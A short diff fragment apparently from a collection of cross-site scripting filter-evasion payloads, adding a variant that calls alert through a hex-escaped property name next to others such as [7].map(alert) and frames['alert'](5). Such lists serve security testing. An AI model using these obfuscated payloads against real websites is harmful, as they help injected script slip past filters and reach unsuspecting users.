@@ -73,6 +73,8 @@ this['alert'](4)
 frames['alert'](5)
 content['alert'](6)
 
+  [7].map(self["\x61\x6c\x65\x72\x74"])
+  
 [7].map(alert)
 [8].find(alert)
 [9].every(alert)
